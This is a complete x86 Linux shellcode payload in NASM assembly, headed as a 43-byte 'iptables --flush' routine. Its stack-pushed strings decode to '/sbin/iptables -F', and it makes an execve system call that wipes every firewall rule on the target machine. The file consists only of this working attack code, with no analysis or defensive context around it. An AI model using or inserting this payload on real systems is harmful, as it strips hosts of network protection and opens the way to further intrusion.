; Linux/x86 iptables --flush 43 bytes

global _start

section .text
_start:
      push byte 11
      pop eax
      cdq
      push edx
      push word 0x462d
      mov ecx, esp
      push edx
      push word 0x7365
      push 0x6c626174
      push 0x70692f6e
      push 0x6962732f
      mov ebx, esp
      push edx
      push ecx
      push ebx
      mov ecx, esp
      int 0x80
